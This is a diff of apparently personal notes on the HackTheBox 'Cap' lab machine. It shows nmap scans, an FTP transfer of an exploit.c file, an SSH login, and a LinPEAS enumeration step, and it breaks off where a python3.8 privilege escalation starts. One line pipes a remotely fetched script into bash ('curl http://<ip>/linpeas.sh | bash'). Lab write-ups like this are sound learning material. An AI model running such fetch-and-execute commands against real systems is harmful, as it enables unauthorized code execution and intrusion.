@@ -11,6 +11,7 @@ PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
 Nmap done: 1 IP address (1 host up) scanned in 78.72 seconds
+________________________________________________________________________________________________________________________
 
 //script enumeration
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 07:35 EDT
@@ -41,6 +42,7 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds
+________________________________________________________________________________________________________________________
 
 #FTP
 
@@ -81,6 +83,7 @@ local: exploit.c remote: exploit.c
 226 Transfer complete.
 ftp> exit
 221 Goodbye.
+________________________________________________________________________________________________________________________
 
 #SSH
 ┌──(kali㉿kali)-[~/HackTheBox/cap]
@@ -93,7 +96,6 @@ Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts.
 nathan@10.10.10.245's password:
 Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
 
-
 Last login: Mon Sep  1 10:35:41 2025 from 
 nathan@cap:~$ ls
 exploit.c  snap  user.txt
@@ -102,6 +104,7 @@ nathan@cap:~$
 nathan@cap:~$ id
 uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
 nathan@cap:~$
+________________________________________________________________________________________________________________________
 
 #LinPEAS
 "LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. The checks are explained on book.hacktricks.wiki"
@@ -121,6 +124,7 @@ nathan@cap:~$ curl http://<ip>/linpeas.sh | bash
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.10.245 - - [02/Sep/2025 10:20:39] "GET /linpeas.sh HTTP/1.1" 200 -
+________________________________________________________________________________________________________________________
 
 //Privilege Escalation
 nathan@cap:/tmp$ /usr/bin/python3.8
